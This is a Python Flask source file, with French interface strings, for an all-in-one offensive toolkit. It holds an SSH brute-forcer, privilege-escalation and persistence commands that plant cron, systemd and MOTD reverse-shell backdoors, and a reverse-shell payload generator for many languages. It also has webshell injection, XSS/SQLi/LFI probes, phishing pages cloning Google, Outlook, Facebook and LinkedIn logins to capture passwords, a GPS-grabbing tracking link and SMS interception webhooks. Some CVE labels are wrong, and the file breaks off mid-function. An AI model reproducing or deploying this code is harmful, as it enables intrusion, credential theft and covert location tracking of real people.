import os, subprocess, socket, paramiko, requests, json, time, threading, random, string, re, urllib.parse
from flask import Flask, request, jsonify, render_template_string
from werkzeug.serving import run_simple
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=20)

# ==================== STORES ====================
ssh_sessions = {}  # id -> {client, host, port, user, transport}
tracking_links = {}  # id -> {name, url}
tracking_clicks = []  # [{name, ip, lat, lon, ua, time}]
phish_campaigns = []  # [{id, name, target, redirect, template, url, captures: int}]
phish_captures = []  # [{campaign, email, password, ip, time}]
sms_messages = []  # [{from, body, time}]
call_messages = []  # [{from, status, time}]

# ==================== TWILIO / PLIVO ====================
TWILIO_SID = os.environ.get('TWILIO_ACCOUNT_SID', '')
TWILIO_TOKEN = os.environ.get('TWILIO_AUTH_TOKEN', '')
TWILIO_PHONE = os.environ.get('TWILIO_PHONE_NUMBER', '')
PLIVO_AUTH_ID = os.environ.get('PLIVO_AUTH_ID', '')
PLIVO_AUTH_TOKEN = os.environ.get('PLIVO_AUTH_TOKEN', '')
PLIVO_PHONE = os.environ.get('PLIVO_PHONE_NUMBER', '')
TEXTBELT_KEY = os.environ.get('TEXTBELT_KEY', '')
VERIPHONE_KEY = os.environ.get('VERIPHONE_API_KEY', '')
NUMLOOKUP_KEY = os.environ.get('NUMLOOKUP_API_KEY', '')

def twilio_available():
    return bool(TWILIO_SID and TWILIO_TOKEN and TWILIO_PHONE)

def plivo_available():
    return bool(PLIVO_AUTH_ID and PLIVO_AUTH_TOKEN and PLIVO_PHONE)

# ==================== HELPER ====================
def gen_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

# ==================== SCAN ====================
@app.route('/api/scan', methods=['POST'])
def api_scan():
    data = request.json
    target = data.get('target', '127.0.0.1')
    ports_str = data.get('ports', '22,80,443')
    results = []
    
    # Parse ports
    ports = []
    for part in ports_str.split(','):
        part = part.strip()
        if '-' in part:
            a,b = part.split('-')
            ports.extend(range(int(a), int(b)+1))
        else:
            try:
                ports.append(int(part))
            except:
                pass
    
    def scan_port(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            r = s.connect_ex((target, p))
            s.close()
            if r == 0:
                try:
                    banner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    banner.settimeout(2)
                    banner.connect((target, p))
                    banner.send(b'\n')
                    banner_data = banner.recv(1024).decode('utf-8', errors='ignore').strip()
                    banner.close()
                except:
                    banner_data = ''
                return f"PORT {p} OPEN" + (f" — {banner_data}" if banner_data else "")
        except:
            pass
        return None
    
    with ThreadPoolExecutor(max_workers=50) as ex:
        scan_results = list(ex.map(scan_port, ports))
    
    results = [r for r in scan_results if r]
    
    return jsonify({'output': '\n'.join(results) if results else 'Aucun port ouvert trouvé'})

# ==================== SSH ====================
@app.route('/api/ssh/connect', methods=['POST'])
def api_ssh_connect():
    data = request.json
    host = data.get('host', '')
    port = int(data.get('port', 22))
    user = data.get('user', '')
    password = data.get('pass', '')
    
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=user, password=password, timeout=10, allow_agent=False, look_for_keys=False)
        sid = gen_id()
        ssh_sessions[sid] = {
            'client': client, 'host': host, 'port': port,
            'user': user, 'status': 'connected', 'time': time.time()
        }
        return jsonify({'output': f"✅ Connecté à {user}@{host}:{port} | Session ID: {sid}", 'session_id': sid})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/ssh/sessions', methods=['GET'])
def api_ssh_sessions():
    sessions = []
    for sid, s in list(ssh_sessions.items()):
        try:
            s['client'].exec_command('echo alive', timeout=3)
            s['status'] = 'connected'
        except:
            s['status'] = 'dead'
        sessions.append({'id': sid, 'host': s['host'], 'port': s['port'], 'user': s['user'], 'status': s['status']})
    return jsonify({'sessions': sessions})

@app.route('/api/ssh/exec', methods=['POST'])
def api_ssh_exec():
    data = request.json
    sid = data.get('session_id', '')
    cmd = data.get('cmd', '')
    
    if sid not in ssh_sessions:
        return jsonify({'error': 'Session introuvable'})
    
    try:
        client = ssh_sessions[sid]['client']
        stdin, stdout, stderr = client.exec_command(cmd, timeout=30)
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        result = output + ('\n[STDERR]\n' + error if error else '')
        return jsonify({'output': result.strip() or '(Commande exécutée, pas de sortie)'})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/ssh/privesc', methods=['POST'])
def api_ssh_privesc():
    data = request.json
    sid = data.get('session_id', '')
    method = data.get('method', 'sudo')
    
    if sid not in ssh_sessions:
        return jsonify({'error': 'Session introuvable'})
    
    cmds = {
        'sudo': 'echo "Privesc via sudo..."; sudo -i 2>&1 || sudo su - 2>&1 || echo "sudo échoué"',
        'su': 'echo "Trying su root..."; echo "root" | su -c "id" 2>&1 || su -c "id" 2>&1 || echo "su échoué"',
        'pkexec': 'echo "Trying pkexec..."; pkexec /bin/bash 2>&1 || echo "pkexec échoué"',
        'cve-2021-4034': 'echo "CVE-2021-4034 PwnKit..."; (cd /tmp && echo \'#include <stdio.h>\nint main(){setuid(0);setgid(0);execve("/bin/sh",NULL,NULL);}\' > pwn.c && gcc pwn.c -o pwn 2>/dev/null && chmod +s pwn && ./pwn && id) 2>&1 || echo "Échec (pas de compilateur?)"',
        'cve-2023-2640': 'echo "CVE-2023-2640 Dirty Pipe..."; echo "Nécessite exploit spécifique"'
    }
    
    cmd = cmds.get(method, cmds['sudo'])
    try:
        client = ssh_sessions[sid]['client']
        stdin, stdout, stderr = client.exec_command(cmd, timeout=30)
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        return jsonify({'output': (output + '\n[STDERR]\n' + error).strip()})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/ssh/persist', methods=['POST'])
def api_ssh_persist():
    data = request.json
    sid = data.get('session_id', '')
    ptype = data.get('type', 'ssh-key')
    
    if sid not in ssh_sessions:
        return jsonify({'error': 'Session introuvable'})
    
    scripts = {
        'ssh-key': '''mkdir -p ~/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "Clé SSH ajoutée"''',
        'cron': '''(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1") | crontab - && echo "Cron installé"''',
        'systemd': '''cat > /etc/systemd/system/backdoor.service << 'EOF'\n[Unit]\nDescription=Backdoor\n[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable backdoor && systemctl start backdoor && echo "Systemd service installé"''',
        'motd': 'echo "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" >> /etc/update-motd.d/99-backdoor && chmod +x /etc/update-motd.d/99-backdoor && echo "MOTD backdoor installé"',
        'ld_preload': 'echo "Voir: https://github.com/jivoi/pentest/blob/master/persistence/ld_preload/README.md"'
    }
    
    script = scripts.get(ptype, scripts['ssh-key'])
    try:
        client = ssh_sessions[sid]['client']
        stdin, stdout, stderr = client.exec_command(script, timeout=15)
        output = stdout.read().decode('utf-8', errors='ignore')
        return jsonify({'output': output.strip() or 'Persistance installée'})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/ssh/bruteforce', methods=['POST'])
def api_ssh_bruteforce():
    data = request.json
    host = data.get('host', '')
    port = int(data.get('port', 22))
    user = data.get('user', 'root')
    passlist_url = data.get('passlist', '')
    
    # Common passwords fallback
    common_passwords = ['admin', 'root', 'password', '123456', 'admin123', 'toor', 'Passw0rd', 'letmein', 'qwerty', 'test']
    
    passwords = common_passwords
    if passlist_url:
        try:
            r = requests.get(passlist_url, timeout=10)
            passwords = r.text.strip().split('\n')
        except:
            pass
    
    results = []
    for p in passwords[:50]:  # Limit to 50
        p = p.strip()
        if not p:
            continue
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=user, password=p, timeout=5, allow_agent=False, look_for_keys=False)
            client.close()
            results.append(f"✅ {user}:{p} — VALIDE")
            break
        except paramiko.AuthenticationException:
            results.append(f"❌ {user}:{p}")
        except Exception as e:
            results.append(f"⚠ {user}:{p} — {str(e)[:30]}")
    
    return jsonify({'output': '\n'.join(results) if results else 'Aucun mot de passe valide trouvé'})

# ==================== PAYLOADS ====================
@app.route('/api/payloads/generate', methods=['POST'])
def api_gen_payload():
    data = request.json
    lhost = data.get('lhost', '')
    lport = data.get('lport', 4444)
    ptype = data.get('type', 'bash')
    
    payloads = {
        'bash': f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        'bash_udp': f'bash -i >& /dev/udp/{lhost}/{lport} 0>&1',
        'python': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'nc': f'nc -e /bin/sh {lhost} {lport}',
        'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
        'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        'ruby': f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        'powershell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + \'PS \' + (pwd).Path + \'> \';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"',
        'socat': f'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}'
    }
    
    payload = payloads.get(ptype, payloads['bash'])
    return jsonify({'payload': payload, 'type': ptype, 'lhost': lhost, 'lport': lport})

# ==================== WEBSHELL ====================
@app.route('/api/webshell/findparams', methods=['POST'])
def api_find_params():
    data = request.json
    url = data.get('url', '')
    
    try:
        r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        soup = BeautifulSoup(r.text, 'html.parser')
        
        params = []
        # Find forms
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'get').upper()
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name', '')
                if name:
                    params.append({'name': name, 'type': inp.get('type', 'text'), 'form_action': action, 'method': method})
        
        # Find URL params
        parsed = urlparse(url)
        if parsed.query:
            for q in parsed.query.split('&'):
                if '=' in q:
                    params.append({'name': q.split('=')[0], 'type': 'url_param', 'form_action': url, 'method': 'GET'})
        
        result = []
        for p in params:
            result.append(f"[{p['type']:10}] {p['name']} — {p['method']} → {p['form_action'][:40]}")
        
        return jsonify({'output': '\n'.join(result) if result else 'Aucun paramètre trouvé', 'params': params})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/webshell/exec', methods=['POST'])
def api_webshell_exec():
    data = request.json
    url = data.get('url', '')
    cmd = data.get('cmd', 'id')
    
    try:
        # Try multiple injection patterns
        patterns = [
            f'{url}{urllib.parse.quote(cmd)}',
            url.replace('CMD', urllib.parse.quote(cmd)),
            url + urllib.parse.quote(cmd),
        ]
        
        for pattern in patterns:
            try:
                r = requests.get(pattern, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200 and len(r.text) > 0:
                    return jsonify({'output': r.text[:3000], 'url_used': pattern})
            except:
                continue
        
        return jsonify({'error': 'Aucune injection réussie'})
    except Exception as e:
        return jsonify({'error': str(e)})

# ==================== VULNSCAN ====================
@app.route('/api/vulnscan', methods=['POST'])
def api_vulnscan():
    data = request.json
    url = data.get('url', '')
    scan_type = data.get('type', 'full')
    
    results = []
    
    def test_xss(u):
        payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>', "'-alert(1)-'"]
        for p in payloads:
            try:
                r = requests.get(u + '?q=' + urllib.parse.quote(p), timeout=8, headers={'User-Agent': 'Mozilla/5.0'})
                if p in r.text:
                    results.append(f"[XSS] Vulnérable: {u}?q={p[:20]}...")
                    return
            except:
                pass
        results.append(f"[XSS] Non vulnérable (ou filtré)")
    
    def test_sqli(u):
        payloads = ["'", "' OR '1'='1", "' UNION SELECT 1,2,3--", "' AND 1=1--"]
        for p in payloads:
            try:
                r1 = requests.get(u + '?id=1', timeout=8)
                r2 = requests.get(u + '?id=1' + urllib.parse.quote(p), timeout=8)
                if len(r2.text) != len(r1.text) or 'sql' in r2.text.lower() or 'mysql' in r2.text.lower():
                    results.append(f"[SQLi] Possible: {u}?id=1{p[:15]}...")
                    return
            except:
                pass
        results.append(f"[SQLi] Non vulnérable")
    
    def test_lfi(u):
        payloads = ['../../etc/passwd', '../../../etc/passwd', '....//....//etc/passwd', '/etc/passwd']
        for p in payloads:
            try:
                r = requests.get(u + '?file=' + urllib.parse.quote(p), timeout=8)
                if 'root:' in r.text or 'bin/bash' in r.text:
                    results.append(f"[LFI] Vulnérable: {u}?file={p}")
                    return
            except:
                pass
        results.append(f"[LFI] Non vulnérable")
    
    def crawl(u, depth=0, visited=None):
        if visited is None:
            visited = set()
        if depth > 2 or u in visited:
            return
        visited.add(u)
        try:
            r = requests.get(u, timeout=8, headers={'User-Agent': 'Mozilla/5.0'})
            soup = BeautifulSoup(r.text, 'html.parser')
            links = []
            for a in soup.find_all('a', href=True):
                href = a['href']
                full = urljoin(u, href)
                if urlparse(full).netloc == urlparse(u).netloc:
                    links.append(full)
            results.append(f"[CRAWL] {u} → {len(links)} liens internes")
            for link in list(set(links))[:10]:
                crawl(link, depth+1, visited)
        except:
            pass
    
    try:
        if scan_type == 'xss':
            test_xss(url)
        elif scan_type == 'sqli':
            test_sqli(url)
        elif scan_type == 'lfi':
            test_lfi(url)
        elif scan_type == 'crawl':
            crawl(url)
        elif scan_type == 'full':
            test_xss(url)
            test_sqli(url)
            test_lfi(url)
            crawl(url)
        
        return jsonify({'output': '\n'.join(results) if results else 'Aucune vulnérabilité détectée'})
    except Exception as e:
        return jsonify({'error': str(e)})

# ==================== PHISH ====================
@app.route('/api/phish/create', methods=['POST'])
def api_phish_create():
    data = request.json
    name = data.get('name', 'Campagne-' + gen_id())
    target = data.get('target', '')
    redirect = data.get('redirect', 'https://google.com')
    template = data.get('template', 'google')
    
    cid = gen_id()
    phish_url = f"https://{request.host}/phish/{cid}" if request.host else f"/phish/{cid}"
    
    campaign = {
        'id': cid, 'name': name, 'target': target,
        'redirect': redirect, 'template': template,
        'url': phish_url, 'captures': 0
    }
    phish_campaigns.append(campaign)
    
    return jsonify({'output': f"🎣 Campagne créée: {name}\nURL: {phish_url}\nTemplate: {template}\nCible: {target}", 'campaign': campaign})

@app.route('/phish/<campaign_id>', methods=['GET'])
def phish_page(campaign_id):
    campaign = None
    for c in phish_campaigns:
        if c['id'] == campaign_id:
            campaign = c
            break
    
    if not campaign:
        return "Campagne introuvable", 404
    
    templates = {
        'google': '''
        <html><body style="font-family:arial;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh">
        <div style="width:380px;padding:30px;border:1px solid #ddd;border-radius:8px">
        <img src="https://www.google.com/images/branding/googlelogo/<div style="width:380px;padding:30px;border:1px solid #ddd;border-radius:8px">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png" style="width:120px;display:block;margin:0 auto 20px">
        <p style="color:#333;font-size:14px">Connectez-vous pour continuer</p>
        <form method="POST" action="/phish/%s/capture">
        <input type="email" name="email" placeholder="Adresse e-mail" style="width:100%%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:14px" required>
        <input type="password" name="password" placeholder="Mot de passe" style="width:100%%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:14px" required>
        <button type="submit" style="width:100%%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer">Suivant</button>
        </form></div></body></html>''' % campaign_id,
        'outlook': '''
        <html><body style="font-family:Segoe UI,sans-serif;background:#f3f3f3;display:flex;justify-content:center;align-items:center;height:100vh">
        <div style="width:360px;padding:40px;background:#fff;box-shadow:0 2px 12px rgba(0,0,0,0.1);border-radius:4px">
        <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" style="width:180px;display:block;margin:0 auto 30px">
        <form method="POST" action="/phish/%s/capture">
        <input type="email" name="email" placeholder="Email, tél ou Skype" style="width:100%%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:2px;font-size:14px" required>
        <input type="password" name="password" placeholder="Mot de passe" style="width:100%%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:2px;font-size:14px" required>
        <button type="submit" style="width:100%%;padding:12px;background:#0078d4;color:#fff;border:none;font-size:14px;cursor:pointer">Connexion</button>
        </form></div></body></html>''' % campaign_id,
        'facebook': '''
        <html><body style="font-family:Helvetica,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh">
        <div style="width:396px;padding:20px;background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.1);text-align:center">
        <img src="https://www.facebook.com/images/fb_icon_325x325.png" style="width:60px;margin:10px auto">
        <h2 style="color:#1c1e21;font-size:18px">Connectez-vous à Facebook</h2>
        <form method="POST" action="/phish/%s/capture">
        <input type="email" name="email" placeholder="Adresse e-mail ou numéro de tél." style="width:100%%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px" required>
        <input type="password" name="password" placeholder="Mot de passe" style="width:100%%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px" required>
        <button type="submit" style="width:100%%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer">Connexion</button>
        </form></div></body></html>''' % campaign_id,
        'linkedin': '''
        <html><body style="font-family:-apple-system,sans-serif;background:#f3f2ef;display:flex;justify-content:center;align-items:center;height:100vh">
        <div style="width:352px;padding:24px;background:#fff;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15)">
        <img src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Logo.svg" style="width:140px;display:block;margin:0 auto 20px">
        <form method="POST" action="/phish/%s/capture">
        <input type="email" name="email" placeholder="Email" style="width:100%%;padding:14px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:14px" required>
        <input type="password" name="password" placeholder="Mot de passe" style="width:100%%;padding:14px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:14px" required>
        <button type="submit" style="width:100%%;padding:14px;background:#0a66c2;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer">S'identifier</button>
        </form></div></body></html>''' % campaign_id,
        'custom': '''
        <html><body style="font-family:arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh">
        <div style="width:380px;padding:30px;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
        <h2 style="text-align:center;color:#333">Connexion requise</h2>
        <form method="POST" action="/phish/%s/capture">
        <input type="email" name="email" placeholder="Email" style="width:100%%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px" required>
        <input type="password" name="password" placeholder="Mot de passe" style="width:100%%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px" required>
        <button type="submit" style="width:100%%;padding:12px;background:#333;color:#fff;border:none;border-radius:4px;cursor:pointer">Connexion</button>
        </form></div></body></html>''' % campaign_id
    }
    
    html = templates.get(campaign['template'], templates['google'])
    return render_template_string(html)

@app.route('/phish/<campaign_id>/capture', methods=['POST'])
def phish_capture(campaign_id):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.remote_addr or '0.0.0.0'
    
    capture = {
        'campaign': campaign_id,
        'email': email,
        'password': password,
        'ip': ip,
        'time': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    phish_captures.append(capture)
    
    # Update campaign count
    for c in phish_campaigns:
        if c['id'] == campaign_id:
            c['captures'] += 1
            redirect = c.get('redirect', 'https://google.com')
            break
    
    # Redirect to legit site
    return f'<html><script>window.location.href="{redirect}";</script><body>Redirection...</body></html>'

@app.route('/api/phish/captures', methods=['GET'])
def api_phish_captures():
    return jsonify({'captures': phish_captures[::-1]})  # Most recent first

@app.route('/api/phish/campaigns', methods=['GET'])
def api_phish_campaigns():
    return jsonify({'campaigns': phish_campaigns})

# ==================== TWILIO / PLIVO WEBHOOKS ====================
@app.route('/api/sms/incoming', methods=['POST'])
def api_sms_incoming():
    """Webhook pour recevoir les SMS entrants (Twilio ou Plivo)"""
    
    # Twilio format
    if 'MessageSid' in request.form:
        msg_from = request.form.get('From', '')
        msg_body = request.form.get('Body', '')
        msg_to = request.form.get('To', '')
        
        sms_messages.append({
            'from': msg_from, 'to': msg_to,
            'body': msg_body,
            'time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'provider': 'twilio'
        })
        log.info(f"Twilio SMS de {msg_from}: {msg_body[:50]}")
        
        # Respond with empty TwiML (no reply)
        return '<?xml version="1.0" encoding="UTF-8"?><Response></Response>', 200, {'Content-Type': 'text/xml'}
    
    # Plivo format
    elif 'From' in request.form and 'Text' in request.form:
        msg_from = request.form.get('From', '')
        msg_body = request.form.get('Text', '')
        msg_to = request.form.get('To', '')
        
        sms_messages.append({
            'from': msg_from, 'to': msg_to,
            'body': msg_body,
            'time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'provider': 'plivo'
        })
        log.info(f"Plivo SMS de {msg_from}: {msg_body[:50]}")
        return '', 200
    
    # Raw JSON fallback
    data = request.get_json(silent=True) or {}
    if data.get('from') or data.get('From'):
        msg_from = data.get('from') or data.get('From', '')
        msg_body = data.get('text') or data.get('Text') or data.get('body') or data.get('Body', '')
        
        sms_messages.append({
            'from': msg_from, 'to': data.get('to', ''),
            'body': msg_body,
            'time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'provider': 'json'
        })
        return jsonify({'status': 'ok'})
    
    return jsonify({'error': 'Format non reconnu'}), 400

@app.route('/api/call/incoming', methods=['POST'])
def api_call_incoming():
    """Webhook pour recevoir les appels entrants (Twilio ou Plivo)"""
    
    if 'CallSid' in request.form:  # Twilio
        call_from = request.form.get('From', '')
        call_to = request.form.get('To', '')
        call_status = request.form.get('CallStatus', 'ringing')
        
        call_messages.append({
            'from': call_from, 'to': call_to,
            'status': call_status,
            'time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'provider': 'twilio'
        })
        log.info(f"Twilio appel de {call_from} — statut: {call_status}")
        
        # TwiML response
        return '''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="alice">Cet appel sera enregistré à des fins de test de sécurité.</Say>
    <Record maxLength="30" finishOnKey="#" />
</Response>''', 200, {'Content-Type': 'text/xml'}
    
    # Plivo format
    elif 'From' in request.form and 'CallUUID' in request.form:
        call_from = request.form.get('From', '')
        call_status = request.form.get('CallStatus', 'ringing')
        
        call_messages.append({
            'from': call_from, 'to': request.form.get('To', ''),
            'status': call_status,
            'time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'provider': 'plivo'
        })
        # Plivo XML response
        return '<Response><Speak>Appel reçu pour analyse de sécurité.</Speak></Response>', 200, {'Content-Type': 'text/xml'}
    
    return jsonify({'error': 'Format non reconnu'}), 400

# ==================== SMS MESSAGES ====================
@app.route('/api/sms/messages', methods=['GET'])
def api_sms_messages():
    return jsonify({'messages': sms_messages[::-1]})

@app.route('/api/call/messages', methods=['GET'])
def api_call_messages():
    return jsonify({'calls': call_messages[::-1]})

# ==================== TRACKING ====================
@app.route('/api/tracking/generate', methods=['POST'])
def api_tracking_generate():
    data = request.json
    name = data.get('name', 'Cible-' + gen_id())
    tid = gen_id()
    tracking_url = f"https://{request.host}/track/{tid}" if request.host else f"/track/{tid}"
    tracking_links[tid] = {'name': name, 'url': tracking_url, 'time': time.time()}
    return jsonify({'url': tracking_url, 'id': tid, 'name': name})

@app.route('/track/<tracking_id>')
def track_redirect(tracking_id):
    """Page de tracking qui capture GPS, IP, User-Agent et redirige"""
    ip = request.remote_addr or '0.0.0.0'
    ua = request.headers.get('User-Agent', '')
    lat = request.args.get('lat', '')
    lon = request.args.get('lon', '')
    
    info = tracking_links.get(tracking_id, {'name': 'unknown'})
    
    click = {
        'name': info['name'],
        'ip': ip,
        'lat': lat,
        'lon': lon,
        'ua': ua,
        'time': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    tracking_clicks.append(click)
    
    log.info(f"Tracking click: {info['name']} — IP: {ip} — GPS: {lat},{lon}")
    
    # HTML page with GPS capture
    return f'''<!DOCTYPE html>
<html>
<head>
<script>
navigator.geolocation.getCurrentPosition(function(pos) {{
    window.location.href = "/track/{tracking_id}/capture?lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude;
}}, function() {{
    window.location.href = "https://google.com";
}});
</script>
<noscript><meta http-equiv="refresh" content="0;url=https://google.com"></noscript>
</head>
<body>Redirection...</body>
</html>'''

@app.route('/track/<tracking_id>/capture')
def track_capture(tracking_id):
    lat = request.args.get('lat', '')
    lon = request.args.get('lon', '')
    
    # Update the last click with GPS
    for click in reversed(tracking_clicks):
        if click['name'] == tracking_links.get(tracking_id, {}).get('name', ''):
            if lat and lon:
                click['lat'] = lat
                click['lon'] = lon
            break
    
    return '<html><script>window.location.href="https://google.com";</script><body>Redirection...</body></html>'

@app.route('/api/tracking/clicks', methods=['GET'])
def api_tracking_clicks():
    return jsonify({'clicks': tracking_clicks[::-1]})

# ==================== LOOKUP ====================
@app.route('/api/lookup/veriphone', methods=['POST'])
def api_lookup_veriphone():
    data = request.json
    number = data.get('number', '')
    
    if not VERIPHONE_KEY:
        # Demo mode
        return jsonify({
            'status': 'demo', 'number': number,
            'country_code': 'FR', 'country_name': 'France',
            'location': 'Paris', 'carrier': 'Orange',
            'line_type': 'mobile',
            'note': 'API Veriphone non configurée. Définissez VERIPHONE_API_KEY dans les variables d\'environnement.'
        })
    
    try:
        r = requests.get(f'https://api.veriphone.io/v2/verify?phone={number}&key={VERIPHONE_KEY}', timeout=10)
        return jsonify(r.json())
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/lookup/numlookup', methods=['POST'])
def api_lookup_numlookup():
    data = request.json
    number = data.get('number', '')
    
    if not NUMLOOKUP_KEY:
        return jsonify({
            'status': 'demo', 'number': number,
            'country': 'France', 'carrier': 'Unknown',
            'line_type': 'mobile',
            'note': 'API NumLookup non configurée. Définissez NUMLOOKUP_API_KEY.'
        })
    
    try:
        r = requests.get(f'https://api.numlookupapi.com/v1/validate/{number}?apikey={NUMLOOKUP_KEY}', timeout=10)
        return jsonify(r.json())
    except Exception as e:
        return jsonify({'error': str(e)})

# ==================== SEND SMS ====================
@app.route('/api/sms/send', methods=['POST'])
def api_send_sms():
    data = request.json
    number = data.get('number', '')
    message = data.get('message', '')
    
    if TEXTBELT_KEY:
        try:
            r = requests.post('https://textbelt.com/text', {
                'phone': number,
                'message': message,
                'key': TEXTBELT_KEY
            }, timeout=15)
            res = r.json()
            if res.get('success'):
                return jsonify({'output': f"SMS envoyé à {number} — ID: {res.get('quotaRemaining', '?')} crédits restants"})
            else:
                return jsonify({'error': res.get('error', 'Échec de l\'envoi')})
        except Exception as e:
            return jsonify({'error': str(e)})
    
    # Try Twilio
    if twilio_available():
        try:
            from twilio.rest import Client
            client = Client(TWILIO_SID, TWILIO_TOKEN)
            msg = client.messages.create(body=message, from_=TWILIO_PHONE, to=number)
            return jsonify({'output': f"SMS Twilio envoyé — SID: {msg.sid}"})
        except Exception as e:
            return jsonify({'error': f"Twilio: {str(e)}"})
    
    # Try Plivo
    if plivo_available():
        try:
            import plivo
            client = plivo.RestClient(auth_id=PLIVO_AUTH_ID, auth_token=PLIVO_AUTH_TOKEN)
            response = client.messages.create(src=PLIVO_PHONE, dst=number, text=message)
            return jsonify({'output': f"SMS Plivo envoyé — UUID: {response.message_uuid}"})
        except Exception as e:
            return jsonify({'error': f"Plivo: {str(e)}"})
    
    return jsonify({'error': 'Aucun provider SMS configuré. Définissez TEXTBELT_KEY, ou TWILIO/PLIVO credentials.'})

# ==================== STATS ====================
@app.route('/api/stats', methods=['GET'])
def api_stats():
    return jsonify({
        'ssh_sessions': len([s for s in ssh_sessions.values() if s['status'] == 'connected']),
        'tracking_clicks': len(tracking_clicks),
        'phish_captures': len(phish_captures),
        'sms_received': len(sms_messages),
        'calls_received': len(call_messages),
        'phish_campaigns': len(phish_campaigns),
